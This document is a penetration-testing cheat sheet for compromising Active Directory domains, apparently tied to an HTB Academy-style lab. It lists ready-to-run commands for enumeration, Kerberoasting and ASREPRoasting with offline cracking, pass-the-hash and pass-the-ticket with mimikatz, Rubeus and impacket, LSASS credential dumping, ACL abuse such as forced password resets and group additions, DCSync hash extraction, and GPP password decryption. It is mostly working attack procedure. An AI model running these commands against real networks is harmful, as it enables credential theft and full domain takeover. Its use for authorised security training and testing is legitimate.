# Internal Enumeration & Lateral Movement

> After finding valid credentials to authenticate to the active directory environment, your final objective is to compromise the entire Active Directory environment.\
> In order to do so, you will probably need to move laterally between users and machine until getting privileged access to the domain controller

## **Enumerating Security Controls**

**Enumerate Windows Defender and App Locker policies from PowerShell:**

1. Check the status of Windows Defender:\
   `Get-MpComputerStatus`
2. View AppLocker policies:\
   `Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`
3. Discover the PowerShell Language Mode being used:\
   `$ExecutionContext.SessionState.LanguageMode`

**Enumerate Windows Local Administrator Password Solution (LAPS):**

> LAPS allows management of unique, randomised local admin passwords on domain-joined hosts.\
> These passwords are centrally stored in Active Directory and restricted to some users through ACLs.\
> **Enumerating LAPS can be useful to find users who have read access to the LAPS passwords**

**Reference/Useful Resource:**\
[https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/laps](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/laps)

**LAPS Toolkit:**

1. Get [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)
2. Import the module in Powershell using `Import-Module .\LAPSToolkit.ps1`
3. Discover LAPS Delegated Groups: `Find-LAPSDelegatedGroups`
4. Check the rights on each computer with LAPS enabled for any groups with read access and users with All Extended Rights: `Find-AdmPwdExtendedRights`
5. Search for computers that have LAPS enabled. This function can discover password expiration and randomized passwords: `Get-LAPSComputers`

***

## **Authenticated Enumeration**

#### **Enumeration using BloodHound**

* **Linux:** Collect Data using the [BloodHound Python Collector](https://github.com/fox-it/BloodHound.py): `sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all`
* **Windows:** Collect data:
  * using [SharpHound Collector](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors): `.\SharpHound.exe -c All --zipfilename NAME`
  * Using [SharpHound.ps1](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1): `Import-Module .\SharpHound.ps1` followed by `Invoke-Bloodhound -collectionmethod all -domain example.test -ldapuser validuserldap -ldappass hispass`
* Run the local Neo4J instance: `neo4j start` and login using the credentials you provided during the setup
* Run the Bloodhound GUI: `bloodhound`
* Upload the ZIP Files obtained by running `bloodhound.py`
* Enumerate the active directory environment using the bloodhound GUI and Cipher Queries:
  * Bloodhound Cipher Queries - Useful Resource:\
    [https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)
  * Getting started with BloodHound GUI:\
    [https://bloodhound.readthedocs.io/en/latest/data-analysis/bloodhound-gui.html](https://bloodhound.readthedocs.io/en/latest/data-analysis/bloodhound-gui.html)

#### **Users and Groups Enumeration**

* PowerShell Oneliner to find all group membership of the current user:\
  `(New-Object System.DirectoryServices.DirectorySearcher("(&(objectCategory=User)(samAccountName=$($env:username)))")).FindOne().GetDirectoryEntry().memberOf`
* CME Users Enumeration:\
  `sudo crackmapexec smb 172.16.5.5 -u validuser -p validpassword --users`
* CME Groups Discovery:\
  `sudo crackmapexec smb 172.16.5.5 -u validuser -p validpassword --groups`
* CME Logged Users Discovery:\
  `sudo crackmapexec smb 172.16.5.125 -u validuser -p validpassword --loggedon-users`
* RPCClient users and relative identifiers enumeration:\
  `rpcclient --user domain\username%password ip` followed by `enumdomusers`
* RPCClient specific user enumeration through relative identifier:\
  `rpcclient --user domain\username%password ip` followed by `queryuser 0x457`
* WindapSearch Domain Admins Group Discovery:\
  `python3 windapsearch.py --dc-ip 172.16.5.5 -u domain\validuser -p validpassword --da`
* WindapSearch Recursive Discovery of users with nester permissions:\
  `python3 windapsearch.py --dc-ip 172.16.5.5 -u domain\validuser -p validpassword -PU`
* PS Active Directory Module - Enumerate Groups:\
  `Import-Module ActiveDirectory` followed by `Get-ADGroup -Filter *`
* PS Active Directory Module - Enumerate Specific Group:\
  `Import-Module ActiveDirectory` followed by `Get-ADGroup -Identity "Backup Operators"`
* PS Active Directory Module - Discover Members of a specific Group:\
  `Import-Module ActiveDirectory` followed by `Get-ADGroupMember -Identity "Backup Operators"`

#### **Lateral Movement**

1. Query domain controllers: `netdom query /domain:inlanefreight.local dc`
2. Query workstations and servers: `netdom query /domain:inlanefreight.local workstation`
3. Enumerate the Remote Desktop Users (RDP) group on a Windows target: `Get-NetLocalGroupMember -ComputerName NAME -GroupName "Remote Desktop Users"`
4. Enumerate the Remote Management Users (Win-RM) group on a Windows target:`Get-NetLocalGroupMember -ComputerName NAME -GroupName "Remote Management Users"`
5. Create a password variable: `$password = ConvertTo-SecureString "PasswordHere" -AsPlainText -Force`
6. Create a PS Credential Object: `$cred = new-object System.Management.Automation.PSCredential ("DOMAIN\username", $password)`
7. Get PowerShell session using a PS Credential Object: `Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred`
8. Get a PowerShell session through WinRM - Linux: `evil-winrm -i 10.129.201.234 -u forend`

#### **SMB Shares Enumeration**

* Run [Snaffler](https://github.com/SnaffCon/Snaffler) _from a Windows host_ to find useful data in shares:\
  `.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data`
* Run [Scavenger](https://github.com/SpiderLabs/scavenger/tree/master) _from a Linux host_ to find useful data in shares:\
  `python3 ./scavenger.py smb -t 10.0.0.10 -u administrator -p Password123 -d testdomain.local`
* CME Shares Enumeration:\
  `sudo crackmapexec smb 172.16.5.5 -u validuser -p validpassword --shares`
* CME Share Spidering:\
  `sudo crackmapexec smb 172.16.5.5 -u validuser -p validpassword -M spider_plus --share sharename`
* SMBMap Share Enumeration:\
  `smbmap -u validuser -p validpassword -d INLANEFREIGHT.LOCAL -H 172.16.5.5`
* SMBMap Share Recursive Directory Listing\
  `smbmap -u validuser -p validpassword -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R SHARENAME --dir-only`
* Download Shares Recursively:\
  `smbget -u guest -R smb://10.129.8.111/Development/`

#### **Enumeration using PowerView**

> Always run `Import-Module .\PowerView.ps1` first to import the PowerView Module in the current PowerShell session

**Domain Information, ACLs & Policies**

* Return the current (or specified) domain information: `Get-Domain`
* Return the list of domain controllers for the specified domain: `Get-DomainController`
* Search all (or specific) organizational units (OUs): `Get-DomainOU`
* Find Objects ACLs: `Find-InterestingDomainAcl`
* Return a list of servers likely functioning as file servers: `Get-DomainFileServer`
* Return all file systems for the specified domain: `Get-DomainDFSShare`
* Return all (or specific) Group Policy Objects (GPOs): `Get-DomainGPO`
* Return the default domain policy or the domain controller policy: `Get-DomainPolicy`

**Users & Groups:**

* Convert a User or Group name to it's SID: `ConvertTo-SID <string>`
* Return all (or specific) users: `Get-DomainUser`
* Return all (or specific) computers: `Get-DomainComputer`
* Return all (or specific) groups: `Get-DomainGroup`
* Find members of a group: `Get-DomainGroupMember -Identity "Domain Admins" -Recurse`
* Find all local groups on local or remote machine: `Get-NetLocalGroup`
* Find all members of a local group: `Get-NetLocalGroupMember`
* Return session information for a remote machine or the local one: `Get-NetSession`
* Check if the current user has admin access to local or remote machine: `Test-AdminAccess`
* Enumerate machines where the current user has local admin access: `Find-LocalAdminAccess`

**Domain Shares:**

* Find a list of open shares on local or remote machine: `Get-NetShare`
* Find reachable shares on domain machines: `Find-DomainShare`
* Enumerate files in shares matching specific criteria: `Find-InterestingDomainShareFile`

**Domain & Forest Trusts:**

* Return domain trusts for a specified domain or the current one: `Get-DomainTrust`
* Return forest trusts for a specified forest or the current one: `Get-ForestTrust`
* Enumerate users who belong to groups outside of the user's domain: `Get-DomainForeignUser`
* Enumerate groups and members outside of the current domain: `Get-DomainForeignGroupMember`
* Enumerate all trusts for current domain and any others seen: `Get-DomainTrustMapping`

***

## **Kerberos**

Kerberos is the default authentication protocol for domain accounts. It is a stateless authentication protocol based on tickets, rather than transmitting user passwords over the network. Domain Controllers have a Kerberos Key Distribution Center (KDC) that issues tickets.\
\
The basic overview of the authentication process is the following:

1. When a user initiates a login request to a system, the client they are using to authenticate requests a ticket from the KDC, encrypting the request with the user's password.
2. If the KDC can decrypt the request (AS-REQ) using their password, it will create a Ticket Granting Ticket (TGT) and transmit it to the user.
3. The user then presents its TGT to a Domain Controller to request a Ticket Granting Service (TGS) ticket, encrypted with the associated service's NTLM password hash.
4. Finally, the client requests access to the required service by presenting the TGS to the application or service, which decrypts it with its password hash.

If the entire process completes appropriately, the user will be permitted to access the requested service or application.

***

### **Kerberoasting**

> Kerberoasting is a technique to collect TGS tickets for service accounts, which can be enumerated by any user since no special privileges are required. To check if a user account is a service user, you just need to check if the property "ServicePrincipalName" (SPN) is not null. In order words, the first step to perform Kerberoasting is to find users with the SPN property set.\
> The goal of Kerberoasting is to crack the TGS tickets for service accounts (with SPN set). The TGS tickets are encrypted with keys derived from user passwords. As a consequence, it's possible to gain the password of the targeted service user by offline password cracking.

{% hint style="warning" %}
If `impacket-GetUserSPNs`throws the following error\
`KRB_AP_ERR_SKEW(Clock skew too great)`\
we need to synchronize the time of the Kali machine with the domain controller. We can use `ntpdate` or `rdate` to do so.
{% endhint %}

1. **Enumerate service accounts with SPN set:**
   * Using GetUsersSPNs.py from Linux:\
     `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/username`
   * Using the (built-in) Active Directory module:\
     `Import-Module ActiveDirectory` followed by `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName`
   * Using PowerView:\
     `Import-Module .\PowerView.ps1` followed by `Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName`
   * Using setspn from Windows:\
     `setspn.exe -Q */*`
2. **Request TGS tickets:**
   * Request all tickets with GetUsersSPNs.py from Linux:\
     `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/username -request -outputfile filename`
   * Request a single ticket with GetUsersSPNs.py from Linux:\
     `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/username -request-user target-user -outputfile filename`
   * Request ticket with PowerView:\
     `Import-Module .\PowerView.ps1` followed by `Get-DomainUser -Identity targetuser | Get-DomainSPNTicket -Format Hashcat`
   * Request all tickets with setspn:\
     `setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }`
   * Request all tickets with mimikatz:\
     `base64 /out:true` followed by `kerberos::list /export`
   * Request specific ticket using Rubeus:\
     `.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast /nowrap`
   * Request tickets for users with admin count set to 1:\
     `.\Rubeus.exe kerberoast /ldapfilter:'admincount=1'`
   * Request all tickets using Rubeus:\
     `.\Rubeus.exe kerberoast /outfile:hashes.kerberoast /nowrap`
3. **Offline Password Cracking:**
   * Using Hashcat:\
     `hashcat -m 13100 tgstickethashfile /usr/share/wordlists/rockyou.txt`
   * Using John:\
     `john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hashes.kerberoast`

> Kerberoasting tools typically request RC4 encryption when performing the attack and initiating TGS-REQ requests. This is because RC4 is weaker and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256.\
> To recognize if a ticket is encrypted with RC4, check the hash value:
>
> * Tickets encrypted with RC4 will begin with `$krb5tgs$23$*`
> * Tickets encrypted with AES will begin with `$krb5tgs$18$*` or `$krb5tgs$17$*`

***

### **ASREPRoasting**

> ASREPRoasting is a technique to steal the password hashes of user accounts that have Kerberos preauthentication disabled.\
> When preauthentication is enabled, a user who needs access to a resource begins the Kerberos authentication process by sending an Authentication Server Request (AS-REQ) message to the domain controller (DC). The timestamp on that message is encrypted with the hash of the user’s password.\
> \
> If the DC can decrypt that timestamp using its own record of the user’s password hash, it will send back an Authentication Server Response (AS-REP) message that contains a Ticket Granting Ticket (TGT) issued by the Key Distribution Center (KDC), which is used for future access requests by the user.\
> \
> However, if preauthentication is disabled, an attacker could request authentication data for any user and the DC would return an AS-REP message. Since part of that message is encrypted using the user’s password, the attacker can then attempt to brute-force the user’s password offline. Note that preauthentication is enabled by default in Active Directory. However, it can be manually disabled for some users accounts.

1. **Enumerate accounts without preauth required**
   * Windows: `Import PowerView.ps1` followed by `Get-DomainUser -PreauthNotRequired -verbose`
   * Linux: `python GetNPUsers.py domain.example -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast`
2. **Perform ASREPRoasting:**
   * (WINDOWS) Rubeus - Targeted User: `.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]`
   * (WINDOWS) Rubeus - All affected users: `.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast`
   * (LINUX) GetNPUsers - Username wordlist: `python3 GetNPUsers.py domain.name/validuser:validpass -dc-ip 10.10.10.1 -usersfile usernames.txt -request -format hashcat -outputfile hashes.txt`
3. **Offline Password Cracking:**
   * `john --wordlist=/usr/share/wordlists/rockyou.txt hashes.asreproast`
   * `hashcat -m 18200 --force -a 0 hashes.asreproast /usr/share/wordlists/rockyou.txt`

***

### **Pass the Hash (PtH)**

> * A Pass the Hash (PtH) attack is a technique where an attacker uses a password hash instead of a plain text password for authentication.
> * The attacker doesn't need to decrypt the hash to authenticate.
> * PtH exploit the authentication protocol, as the password hash remains static for every session until the password is changed.
> * Note: the attacker must have administrative privileges or particular privileges on the target machine to obtain a password hash.
> * Hashes can be obtained in several ways, including:
>   * Dumping the local SAM database from a compromised host.
>   * Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller.
>   * Pulling the hashes from memory (lsass.exe).

**Performing PtH Attacks:**

1. Windows - Using mimikatz:\
   `privilege::debug "sekurlsa::pth /user:username /rc4:hash /domain:domain.name /run:cmd.exe" exit`
2. Linux - Using PsExec:\
   `impacket-psexec user@targetIP -hashes :hash`
3. Linux - Using evil-winrm:\
   `evil-winrm -i <ip> -u Administrator -H "<passwordhash>"`
4. Linux - Using crackmapexec:\
   `crackmapexec smb targetIP -u Administrator -d domain.name -H hash`
5. Pass the Hash with RDP:
   * Run `xfreerdp /v:targetIP /u:user /pth:hashvalue`
   * If Restricted Admin Mode is disabled, you will read a message telling you "account restrictions are preventing this user from signin in"
   * You can enable restricted admin mode (which is disabled by default) using the following:\
     `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`
   * After that, you can try to login again using the first command

***

### **Pass the Ticket (PtT)**

> * Another method for moving laterally in an Active Directory environment is called a Pass the Ticket (PtT) attack.
> * In this attack, we use a stolen Kerberos ticket to move laterally instead of an NTLM password hash
> * To perform PtT you can either use a TGS or a TGT
> * After performing PtT, the ticket will be stored in the current logon session

**Performing PtT Attacks:**

1. Check the [Kerberoasting Section](internal-enumeration-and-lateral-movement.md#kerberoasting) to check how to request tickets
2. PtT using Rubeus: `Rubeus.exe asktgt /domain:domain.name /user:username /rc4:hash /ptt`
3. PtT using Rubeus with .kirbi file: `Rubeus.exe ptt /ticket:file.kirbi`
4. PtT using Rubeus - alternative:
   * Convert a .kirbi file to base64:`[Convert]::ToBase64String([IO.File]::ReadAllBytes("file.kirbi"))`
   * Perform PtT using the base64 value you just got: `Rubeus.exe ptt /ticket:base64output`
5. PtT using Mimikatz with .kirbi file: `privilege::debug kerberos::ptt "path-to-file.kirbi"`
6. PtT using Mimikatz - PowerShell Remoting with Pass the Ticket:
   * You can leverage Mimikatz to import a ticket and open a PowerShell console to connect to the target machine
   * First, perform PtT using mimikatz, then
   * Open a PowerShell console: `powershell`
   * Connect to the target machine: `Enter-PSSession -ComputerName DC01`

***

### **Cached Active Directory Credentials**

Since Microsoft's implementation of Kerberos makes use of single sign-on, password hashes must be stored somewhere in order to renew a TGT request. In modern versions of Windows, these hashes are stored in the Local Security Authority Subsystem Service (LSASS) memory space. If we gain access to these hashes, we could crack them to obtain the cleartext password or reuse them to perform various actions.

Since the LSASS process is part of the operating system and runs as SYSTEM, we need SYSTEM (or local administrator) permissions to gain access to the hashes stored on a target. To make things even more tricky, the data structures used to store the hashes in memory are not publicly documented, and they are also encrypted with an LSASS-stored key.

Nevertheless, since the extraction of cached credentials is a large attack vector against Windows and Active Directory, several tools have been created to extract the hashes. The most popular of these tools is Mimikatz.&#x20;

From Mimikatz, we can run `sekurlsa::logonpasswords` to dump the credentials of all logged-on users with the Sekurlsa module. This should dump hashes for all users logged on to the current workstation or server, including remote logins like Remote Desktop sessions

***

### **Kerberos Double Hop Problem**

* The kerberos "double hop" is an issue that arises whenever attempting to use Kerberos authentication between two or more hops.
* Basically, when an authentication occurs through Kerberos, credentials aren't cached in memory.
* For example, when using WinRM to authenticate over two or more connections, the user's password is never cached as part of their login.
* In the simplest terms, in this situation, when we try to issue a multi-server command, our credentials will not be sent from the first machine to the second.
* Refer to the resources below to find workarounds and more information about this problem.

**Useful Resources:**

1. [https://posts.slayerlabs.com/double-hop/](https://posts.slayerlabs.com/double-hop/)
2. [https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberos-double-hop-problem](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberos-double-hop-problem)

***

## **ACL Enumeration & Attacks**

> Enumerating ACLs in the AD environment can often turn to estabilish persistence, moving laterally or, in some cases, gaining privilege escalation.

Some interesting ACLs to enumerate and attack are the following:

1. [ForceChangePassword](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#forcechangepassword): allows resetting a password without prior knowledge of the current password.
2. [GenericWrite](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericwrite): allows writing to any non-protected object attribute.
   * If GenericWrite applies to a `user`, you can assign a fake SPN to such account and perform a targeted Kerberoasting attack.
   * If GenericWrite applies to a `group`, you can add any user account to such group and gain its privileges.
   * If GenericWrite applies to a `computer object`, you can perform a resource-based constrained delegation attack.
3. [AddSelf](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#addself): shows the security groups to which the user can join.
4. [GenericAll](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericall): gain full control over a target object.
   * If GenericAll applies to a `user` or a `group`, you can modify memberships, force password change or perform a targeted Kerberoasting attack
   * If GenericAll applies to a `computer object` and LAPS is in use, you can read the LAPS password and gain local admin access on the target machine

### **ACL Enumeration**

**Manual ACL Enumeration with PowerView:**

1. Always start by importing the PowerView module in the current PS session: `Import-Module .\PowerView.ps1`
2. Find interesting ACLs: `Find-InterestingDomainAcl`
3. Get target user's sid: `$sid = Convert-NameToSid targetuser`
4. Check target user group membership: `Get-DomainUser -Identity targetuser | select samaccountname,objectsid,memberof,useraccountcontrol | fl`
5. Find all domain object that the user has rights over: `Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}`
6. Discover an object's ACL based on its GUID: `Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}`
7. Check target user (by SID) to check replication rights (DCSync): `$sid= "SID-VALUE" Get-ObjectAcl "DC=domainname,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl`

**ACL Enumeration with BloodHound:**\
Refer to the previous section

***

### **ACL Abuse Tactics**

> **Prerequisite:** You must have previously found one of the following ACLs by using bloodhound or manual enumeration techniques

#### **Abusing ForcePasswordChange to Change a User's Password**

1. Create a PSCredential Object with the credential of the current user (the one you are currently using to enumerate)
   * `$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force`
   * `$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\validuser', $SecPassword)`
2. Create a new target user password:
   * `$targetUserNewPassword = ConvertTo-SecureString 'blabla' -AsPlainText -Force`
3. Change the target user's password using PowerView:
   * `Import-Module .\PowerView.ps1`
   * `Set-DomainUserPassword -Identity targetUsername -AccountPassword $targetUserNewPassword -Credential $Cred -Verbose`

#### **Abusing GenericAll to Add the Current User to a Group**

1. Create a PSCredential Object with the credential of the current user (the one you are currently using to enumerate)
   * `$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force`
   * `$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\validuser', $SecPassword)`
2. Show the current members of the target group:
   * `Get-ADGroup -Identity "Target Group" -Properties * | Select -ExpandProperty Members`
3. Add the current user to the target group:
   * `Add-DomainGroupMember -Identity 'Target Group' -Members 'targetuser' -Credential $Cred -Verbose`
4. Confirm the user was added:
   * `Get-DomainGroupMember -Identity "Target Group" | Select MemberName`

#### **Abusing GenericWrite to Add Fake SPN and Perform Targeted Kerberoasting**

> If you have control of a Linux domain-joined host, you can use [TargetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) to perform all the following steps in one command

1. Create a PSCredential Object with the credential of a user who shares group membership with the target user
   * `$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force`
   * `$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\validuser', $SecPassword)`
2. Create a fake SPN:
   * `Set-DomainObject -Credential $Cred -Identity targetuser -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose`
3. Kerberoast with Rubeus or any alternatives, see the [Kerberoasting Section](internal-enumeration-and-lateral-movement.md#kerberoasting)
   * `.\Rubeus.exe kerberoast /user:targetuser /nowrap`

***

#### **DCSync (Replicating Directory Changes & Replicating Directory Changes All)**

> DCSync is a technique for stealing the Active Directory password database by using the built-in Directory Replication Service Remote Protocol, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a DC to retrieve user NTLM password hashes by requesting a Domain Controller to replicate passwords via the DS-Replication-Get-Changes-All extended right, which allows the replication of secret data.\
> \
> To perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the `Replicating Directory Changes` and `Replicating Directory Changes All` permissions set).\
> Domain/Enterprise Admins and default domain administrators have this right by default.

**Enumerate and Perform a DCSync Attack:**

1. Check target user (by SID) to check replication rights (DCSync):
   * `Import-Module .\PowerView.ps1`
   * `$sid = Convert-NameToSid targetuser` followed by
   * `Get-ObjectAcl "DC=domainname,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl`
2. Extract NTLM hashes from the NDTS.dit file on the DC:
   * Linux: `secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/user-with-replication-rights@172.16.5.5 -use-vss`
   * Windows(Mimikatz): `lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator`

***

## **Miscellaneous Misconfigurations**

**Passwords in User Description Field:**

* Sensitive information such as account passwords are sometimes found in the user account Description or Notes fields and can be quickly enumerated using PowerView.
* `Import-Module .\PowerView.ps1` followed by `Get-DomainUser * | Select-Object samaccountname,description`

**Password not Required or not Subject to Length Policy:**

* It is possible to come across domain accounts with the `passwd_notreqd` field set in the userAccountControl attribute.
* If this is set, _the user is not subject to the current password policy length_, meaning they could have a _shorter password or no password at all_ (if empty passwords are allowed in the domain)
* [PowerSploit](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainUser/) - enumerate users with the passwd\_notreqd field:\
  `Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol`

**New Group Policy Preferences (GPP):**

* When a new GPP is created, an `.xml` file is created in the `SYSVOL` share, which is also cached locally on endpoints that the Group Policy applies to.
* These files can contain an array of configuration data and defined passwords.
* The `cpassword` attribute value is AES-256 bit encrypted, but [Microsoft published the AES private key on MSDN](https://learn.microsoft.com/en-us/openspecs/windows\_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN), which can be used to decrypt the password.
* Any domain user can read these files as they are stored on the SYSVOL share, and all authenticated users in a domain, by default, have read access to this domain controller share.
* If you retrieve the cpassword value more manually, run `gpp-decrypt followed by the cpassword hash value` to decrypt the password
* Using CrackMapExec: `crackmapexec smb -L | grep gpp`
